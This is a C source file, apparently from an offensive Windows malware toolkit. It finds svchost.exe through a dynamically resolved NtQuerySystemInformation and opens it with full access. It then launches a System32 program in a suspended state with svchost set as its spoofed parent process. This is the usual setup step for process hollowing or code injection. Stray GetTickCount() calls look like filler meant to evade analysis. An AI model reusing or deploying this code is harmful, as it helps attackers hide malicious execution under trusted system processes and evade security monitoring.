#ifdef NO_WINTERNL
#define _WINTERNL_
#endif

#pragma once
#include <Windows.h>
#include <stdio.h>
//#include "../EnumerationSpells/ProcessEnumNtQuerySysInfo.h"
#include "../UtilitySpells/Structs.h"
#include "api.h"

typedef NTSTATUS (NTAPI* fnNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);

BOOL GetRemoteParentProcess(IN LPWSTR szProcessName, OUT PDWORD pdwProcessID, OUT OPTIONAL PHANDLE phProcess, OUT OPTIONAL HANDLE* hThread) {

	GetTickCount();

	NTSTATUS						STATUS							= 0x00;
	fnNtQuerySystemInformation		pNtQuerySystemInformation		= NULL;
	WCHAR							wcUpperCaseProcName[MAX_PATH]	= { 0x00 };
	ULONG							uArrayLength					= 0x00;
	PSYSTEM_PROCESS_INFORMATION		pSystemProcInfo					= NULL;
	PBYTE							pTmpPntrVar						= NULL;

	if (!szProcessName || !pdwProcessID || lstrlenW(szProcessName) >= MAX_PATH)
		return FALSE;

	for (int i = 0; i < lstrlenW(szProcessName); i++) {
		if (szProcessName[i] >= 'a' && szProcessName[i] <= 'z')
			wcUpperCaseProcName[i] = szProcessName[i] - 'a' + 'A';
		else
			wcUpperCaseProcName[i] = szProcessName[i];
	}

	if (!(pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandleW(L"ntdll"), "NtQuerySystemInformation"))) {
		printf("[!] GetProcAddress Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	STATUS = pNtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &uArrayLength);

	if (!(pTmpPntrVar = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, uArrayLength))) {
		printf("[!] HeapAlloc Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	if (!NT_SUCCESS((STATUS = pNtQuerySystemInformation(SystemProcessInformation, pTmpPntrVar, uArrayLength, NULL)))) {
		printf("[!] NtQuerySystemInformation Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	pSystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)pTmpPntrVar;

	GetTickCount();

	while (pSystemProcInfo->NextEntryOffset) {

		WCHAR	szUprProcName[MAX_PATH] = { 0x00 };

		if (!pSystemProcInfo->ImageName.Length || pSystemProcInfo->ImageName.Length >= MAX_PATH)
			goto _NEXT_ELEMENT;

		for (int i = 0; i < pSystemProcInfo->ImageName.Length; i++) {
			if (pSystemProcInfo->ImageName.Buffer[i] >= 'a' && pSystemProcInfo->ImageName.Buffer[i] <= 'z')
				szUprProcName[i] = pSystemProcInfo->ImageName.Buffer[i] - 'a' + 'A';
			else
				szUprProcName[i] = pSystemProcInfo->ImageName.Buffer[i];
		}

		GetTickCount();

		if (wcscmp(wcUpperCaseProcName, szUprProcName) == 0x00) {
			if (phProcess)
				*phProcess = pOpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD64)pSystemProcInfo->UniqueProcessId);
			
			*pdwProcessID = (DWORD64)pSystemProcInfo->UniqueProcessId;
			

			break;
		}

		GetTickCount();

_NEXT_ELEMENT:
		pSystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)pSystemProcInfo + pSystemProcInfo->NextEntryOffset);
	}

_END_OF_FUNC:
	if (pTmpPntrVar)
		HeapFree(GetProcessHeap(), 0x00, pTmpPntrVar);
	return (*pdwProcessID) ? TRUE : FALSE;
}

BOOL GetRemoteProcess( IN LPWSTR lpProcessName,OUT DWORD* dwProcessId,OUT HANDLE* hProcess,OUT HANDLE* hThread) {

LPWSTR szProcessName = L"svchost.exe";
HANDLE hParentProcess = NULL;
DWORD dwParentProcessId = NULL;

GetRemoteParentProcess(szProcessName, &dwParentProcessId, &hParentProcess, NULL);


CHAR                               lpPath               [MAX_PATH * 2];
CHAR                               WnDr                 [MAX_PATH];

SIZE_T                             sThreadAttList       = NULL;
PPROC_THREAD_ATTRIBUTE_LIST        pThreadAttList       = NULL;

STARTUPINFOEXA                     SiEx                = { 0 };
PROCESS_INFORMATION                Pi                  = { 0 };

RtlSecureZeroMemory(&SiEx, sizeof(STARTUPINFOEXA));
RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

// Setting the size of the structure
SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);

if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
    printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
    return FALSE;
}

sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);

//-------------------------------------------------------------------------------

// This will fail with ERROR_INSUFFICIENT_BUFFER, as expected
InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);	

// Allocating enough memory
pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
if (pThreadAttList == NULL){
    printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
    return FALSE;
}

// Calling InitializeProcThreadAttributeList again, but passing the right parameters
if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList)) {
    printf("[!] InitializeProcThreadAttributeList Failed With Error : %d \n", GetLastError());
    return FALSE;
}

if (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
    printf("[!] UpdateProcThreadAttribute Failed With Error : %d \n", GetLastError());
    return FALSE;
}

// Setting the LPPROC_THREAD_ATTRIBUTE_LIST element in SiEx to be equal to what was
// created using UpdateProcThreadAttribute - that is the parent process
SiEx.lpAttributeList = pThreadAttList;

//-------------------------------------------------------------------------------

if (!CreateProcessA(
    NULL,
    lpPath,
    NULL,
    NULL,
    FALSE,
    EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
    NULL,
    NULL,
    &SiEx.StartupInfo,
    &Pi)) {
    printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
    return FALSE;
}


*dwProcessId	= Pi.dwProcessId;
*hProcess		= Pi.hProcess;
*hThread		= Pi.hThread;


// Cleaning up
DeleteProcThreadAttributeList(pThreadAttList);
CloseHandle(hParentProcess);

if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
    return TRUE;

return FALSE;

}